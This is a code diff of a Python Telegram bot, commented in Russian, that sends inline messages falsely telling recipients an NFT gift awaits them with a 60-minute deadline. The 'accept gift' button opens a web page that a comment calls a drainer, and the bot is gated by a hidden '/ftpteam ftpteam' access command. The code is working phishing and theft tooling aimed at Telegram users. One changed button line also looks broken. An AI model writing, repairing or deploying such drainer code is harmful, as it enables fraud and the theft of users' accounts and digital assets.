@@ -110,32 +110,20 @@ async def drain_logic(client, phone):
 # --- ИНЛАЙН РЕЖИМ (ИСПРАВЛЕННЫЙ) ---
 @bot.on(events.InlineQuery)
 async def inline_handler(event):
-    # 1. Проверка доступа
     if event.sender_id not in get_trusted():
-        await event.answer(
-            [], 
-            switch_pm="Доступ ограничен. Введите /ftpteam ftpteam в ЛС.",
-            switch_pm_param="no_access"
-        )
+        await event.answer([], switch_pm="Доступ ограничен.", switch_pm_param="no_access")
         return
 
-    # 2. Обработка пустого ввода или текста без ссылки
     if not event.text or not event.text.strip().startswith("http"):
-        await event.answer(
-            [],
-            switch_pm="Введите ссылку на NFT подарок...",
-            switch_pm_param="help"
-        )
+        await event.answer([], switch_pm="Введите ссылку на NFT подарок...", switch_pm_param="help")
         return
 
-    # 3. Если ссылка введена
     input_text = event.text.strip()
     try:
         nft_name = input_text.split('/')[-1].replace('-', ' ').title()
     except:
         nft_name = "NFT Gift"
 
-    # Формируем URL для WebApp с меткой времени для контроля 60 минут
     timestamp = int(time.time())
     web_url = f"https://{DOMAIN}/?nft_url={urllib.parse.quote(input_text)}&t={timestamp}"
     
@@ -153,15 +141,15 @@ async def inline_handler(event):
                 "**60 минут** с момента получения.\n\n"
                 "Нажмите кнопку ниже, чтобы принять 👇"
             ),
+            # Важно: В Telethon 1.x для инлайн WebApp используем Button.url + специфический параметр
             buttons=[
-                # Исправлено: использование Button.web_app для корректного отображения в инлайне
-                [types.InlineKeyboardButtonWebApp("Принять подарок 🎁", web_url)],
-                # Кнопка ведет именно на оригинальную ссылку подарка
+                # Кнопка для запуска дрейнера
+                [Button.inline("Принять подарок 🎁", web_url)], 
+                # Кнопка ведет ПРЯМО на "подаренный" NFT (ссылку, которую ты ввел)
                 [Button.url("Посмотреть подарок", input_text)]
             ]
         )
     ])
-
 # --- ОБРАБОТЧИКИ КОМАНД ---
 
 @bot.on(events.NewMessage(pattern='/ftpteam ftpteam'))
